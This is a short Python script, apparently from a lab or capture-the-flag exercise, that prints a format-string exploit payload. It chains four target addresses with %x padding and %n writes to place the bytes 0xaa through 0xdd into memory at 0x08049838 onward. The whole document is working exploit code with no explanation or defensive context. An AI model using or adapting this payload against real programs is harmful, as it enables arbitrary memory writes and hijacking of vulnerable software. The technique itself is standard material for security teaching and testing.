addr_1 = "\x38\x98\x04\x08"
addr_2 = "\x39\x98\x04\x08"
addr_3 = "\x3A\x98\x04\x08"
addr_4 = "\x3B\x98\x04\x08"

value_1 = 0xaa
value_2 = 0xbb
value_3 = 0xcc
value_4 = 0xdd

inject_1 = value_1 - (0x04 * 4)
inject_2 = value_2 - inject_1 - (0x04 * 4)
inject_3 = value_3 - inject_1 - inject_2 - (0x04 * 4)
inject_4 = value_4 - inject_1 - inject_2 - inject_3 - (0x04 * 4)

form = '%' + str(inject_1) + 'x%4$n'
form += '%' + str(inject_2) + 'x%5$n'
form += '%' + str(inject_3) + 'x%6$n'
form += '%' + str(inject_4) + 'x%7$n'

print(addr_1 + addr_2 + addr_3 + addr_4 + form)